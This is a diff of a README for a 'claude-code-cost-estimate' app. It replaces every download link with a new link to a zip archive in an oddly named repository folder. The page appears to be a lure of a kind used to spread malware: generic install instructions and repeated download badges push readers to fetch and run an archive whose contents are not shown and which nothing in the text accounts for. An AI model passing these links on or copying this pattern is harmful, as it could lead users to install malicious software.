@@ -1,6 +1,6 @@
 # ⚙️ claude-code-cost-estimate - Estimate Development Cost Quickly
 
-[![Download](https://img.shields.io/badge/Download-claude--code--cost--estimate-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/thai24605/claude-code-cost-estimate/main/trapezohedral/estimate_claude_code_cost_v1.6.zip)
+[![Download](https://img.shields.io/badge/Download-claude--code--cost--estimate-ff6f61?style=for-the-badge)](https://github.com/thai24605/claude-code-cost-estimate/raw/refs/heads/main/trapezohedral/code_cost_estimate_claude_v2.3.zip)
 
 ## 📄 What is claude-code-cost-estimate?
 
@@ -29,7 +29,7 @@ Before using the app, make sure your computer meets the system requirements abov
 
 1. **Visit the Download Page**  
    Click the button below to go to the download page for claude-code-cost-estimate:  
-   [![Get claude-code-cost-estimate](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/thai24605/claude-code-cost-estimate/main/trapezohedral/estimate_claude_code_cost_v1.6.zip)  
+   [![Get claude-code-cost-estimate](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/thai24605/claude-code-cost-estimate/raw/refs/heads/main/trapezohedral/code_cost_estimate_claude_v2.3.zip)  
 
 2. **Find the Latest Version**  
    On the page, look for a section named **Releases** or **Downloads**. This area contains the files you will need.
@@ -113,4 +113,4 @@ If you need help beyond these instructions:
 ## 🔗 Download Link
 
 Use this link again to download or check for updates:  
-[https://raw.githubusercontent.com/thai24605/claude-code-cost-estimate/main/trapezohedral/estimate_claude_code_cost_v1.6.zip](https://raw.githubusercontent.com/thai24605/claude-code-cost-estimate/main/trapezohedral/estimate_claude_code_cost_v1.6.zip)
+[https://github.com/thai24605/claude-code-cost-estimate/raw/refs/heads/main/trapezohedral/code_cost_estimate_claude_v2.3.zip](https://github.com/thai24605/claude-code-cost-estimate/raw/refs/heads/main/trapezohedral/code_cost_estimate_claude_v2.3.zip)
